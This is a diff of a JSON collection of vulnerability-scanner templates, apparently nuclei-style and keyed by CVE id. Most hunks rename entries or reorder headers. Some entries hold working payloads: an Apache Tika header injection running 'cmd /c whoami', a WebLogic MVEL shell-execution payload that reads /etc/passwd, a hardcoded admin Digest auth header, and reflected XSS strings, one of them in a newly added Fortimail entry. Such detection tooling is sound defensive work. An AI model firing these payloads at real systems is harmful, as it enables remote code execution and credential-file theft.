@@ -2232,7 +2232,7 @@
     {
       "id": "CVE-2011-2780",
       "info": {
-        "name": "Chyrp 2.x - Local File Inclusion (LFI)",
+        "name": "Chyrp 2.x - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -2262,7 +2262,7 @@
     {
       "id": "CVE-2011-4336",
       "info": {
-        "name": "Tiki Wiki CMS Groupware 7.0 has XSS",
+        "name": "Tiki Wiki CMS Groupware 7.0 Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -2277,7 +2277,7 @@
     {
       "id": "CVE-2011-4618",
       "info": {
-        "name": "Advanced Text Widget < 2.0.2 - Reflected Cross-Site Scripting (XSS)",
+        "name": "Advanced Text Widget < 2.0.2 - Reflected Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -2292,7 +2292,7 @@
     {
       "id": "CVE-2011-4624",
       "info": {
-        "name": "GRAND FlAGallery 1.57 - Reflected Cross-Site Scripting (XSS)",
+        "name": "GRAND FlAGallery 1.57 - Reflected Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -2322,7 +2322,7 @@
     {
       "id": "CVE-2011-4926",
       "info": {
-        "name": "Adminimize 1.7.22 - Reflected Cross-Site Scripting (XSS)",
+        "name": "Adminimize 1.7.22 - Reflected Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -2337,7 +2337,7 @@
     {
       "id": "CVE-2011-5106",
       "info": {
-        "name": "WordPress Plugin Flexible Custom Post Type < 0.1.7 - Reflected Cross-Site Scripting (XSS)",
+        "name": "WordPress Plugin Flexible Custom Post Type < 0.1.7 - Reflected Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -2352,7 +2352,7 @@
     {
       "id": "CVE-2011-5107",
       "info": {
-        "name": "Alert Before Your Post <= 0.1.1 - Reflected Cross-Site Scripting (XSS)",
+        "name": "Alert Before Your Post <= 0.1.1 - Reflected Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -2367,7 +2367,7 @@
     {
       "id": "CVE-2011-5179",
       "info": {
-        "name": "Skysa App Bar 1.04 - Reflected Cross-Site Scripting (XSS)",
+        "name": "Skysa App Bar 1.04 - Reflected Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -2382,7 +2382,7 @@
     {
       "id": "CVE-2011-5181",
       "info": {
-        "name": "ClickDesk Live Support Live Chat 2.0 - Reflected Cross-Site Scripting (XSS)",
+        "name": "ClickDesk Live Support Live Chat 2.0 - Reflected Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -2397,7 +2397,7 @@
     {
       "id": "CVE-2011-5265",
       "info": {
-        "name": "Featurific For WordPress 1.6.2 - Reflected Cross-Site Scripting (XSS)",
+        "name": "Featurific For WordPress 1.6.2 - Reflected Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -2442,7 +2442,7 @@
     {
       "id": "CVE-2012-0901",
       "info": {
-        "name": "YouSayToo auto-publishing 1.0 - Reflected Cross-Site Scripting (XSS)",
+        "name": "YouSayToo auto-publishing 1.0 - Reflected Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -2531,7 +2531,7 @@
     {
       "id": "CVE-2012-1835",
       "info": {
-        "name": "WordPress Plugin All-in-One Event Calendar 1.4 - Reflected Cross-Site Scripting (XSS)",
+        "name": "WordPress Plugin All-in-One Event Calendar 1.4 - Reflected Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -2546,7 +2546,7 @@
     {
       "id": "CVE-2012-2371",
       "info": {
-        "name": "WP-FaceThumb 0.1 - Reflected Cross-Site Scripting (XSS)",
+        "name": "WP-FaceThumb 0.1 - Reflected Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -2577,7 +2577,7 @@
     {
       "id": "CVE-2012-4242",
       "info": {
-        "name": "WordPress Plugin MF Gig Calendar 0.9.2 - Reflected Cross-Site Scripting (XSS)",
+        "name": "WordPress Plugin MF Gig Calendar 0.9.2 - Reflected Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -2607,7 +2607,7 @@
     {
       "id": "CVE-2012-4273",
       "info": {
-        "name": "2 Click Socialmedia Buttons < 0.34 - Reflected Cross Site Scripting (XSS)",
+        "name": "2 Click Socialmedia Buttons < 0.34 - Reflected Cross Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -2638,7 +2638,7 @@
     {
       "id": "CVE-2012-4768",
       "info": {
-        "name": "WordPress Plugin Download Monitor < 3.3.5.9 - Reflected Cross-Site Scripting (XSS)",
+        "name": "WordPress Plugin Download Monitor < 3.3.5.9 - Reflected Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -2668,7 +2668,7 @@
     {
       "id": "CVE-2012-4889",
       "info": {
-        "name": "ManageEngine Firewall Analyzer 7.2 - Reflected Cross Site Scripting (XSS)",
+        "name": "ManageEngine Firewall Analyzer 7.2 - Reflected Cross Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -2699,7 +2699,7 @@
     {
       "id": "CVE-2012-5913",
       "info": {
-        "name": "WordPress Integrator 1.32 - Reflected Cross-Site Scripting (XSS)",
+        "name": "WordPress Integrator 1.32 - Reflected Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -2764,7 +2764,7 @@
     {
       "id": "CVE-2013-2287",
       "info": {
-        "name": "WordPress Plugin Uploader 1.0.4 - Reflected Cross-Site Scripting (XSS)",
+        "name": "WordPress Plugin Uploader 1.0.4 - Reflected Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -6051,11 +6051,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
+            "Connection": "close",
             "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
-            "Content-type": "image/jp2",
-            "Connection": "close"
+            "Content-type": "image/jp2"
           },
           "method": "PUT",
           "path": [
@@ -9559,8 +9559,8 @@
         {
           "body": "test_handle=com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField(\"connectionHandler\");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(\"getServletRequest\").invoke(obj); String cmd = req.getHeader(\"Test-Header\");String[] cmds = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ? new String[]{\"cmd.exe\", \"/c\", cmd} : new String[]{\"/bin/sh\", \"-c\", cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(\"\\\\A\").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(\"getResponse\").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();')\n",
           "headers": {
-            "Test-Header": "cat /etc/passwd",
-            "Content-Type": "application/x-www-form-urlencoded"
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Test-Header": "cat /etc/passwd"
           },
           "method": "POST",
           "path": [
@@ -13244,7 +13244,7 @@
     {
       "id": "CVE-2021-27358",
       "info": {
-        "name": "Grafana unauthenticated snapshot creation",
+        "name": "Grafana Unauthenticated Snapshot Creation",
         "severity": "high"
       },
       "requests": [
@@ -14290,8 +14290,8 @@
       "requests": [
         {
           "headers": {
-            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\"",
-            "Referer": "{{BaseURL}}/assets/base/home.html"
+            "Referer": "{{BaseURL}}/assets/base/home.html",
+            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\""
           },
           "method": "GET",
           "path": [
@@ -14593,7 +14593,7 @@
     {
       "id": "CVE-2021-39226",
       "info": {
-        "name": "Grafana Snapshot authentication bypass",
+        "name": "Grafana Snapshot Authentication Bypass",
         "severity": "critical"
       },
       "requests": [
@@ -15203,6 +15203,21 @@
         {
           "raw": [
             "POST /cas/v1/tickets/ HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nusername=%3Cimg%2Fsrc%2Fonerror%3Dalert%28document.domain%29%3E&password=test\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-43062",
+      "info": {
+        "name": "Fortinet Fortimail 7.0.1 - Reflected XSS",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/fmlurlsvc/?=&url=https%3A%2F%2Fgoogle.com<Svg%2Fonload%3Dalert(document.domain)>"
           ]
         }
       ]
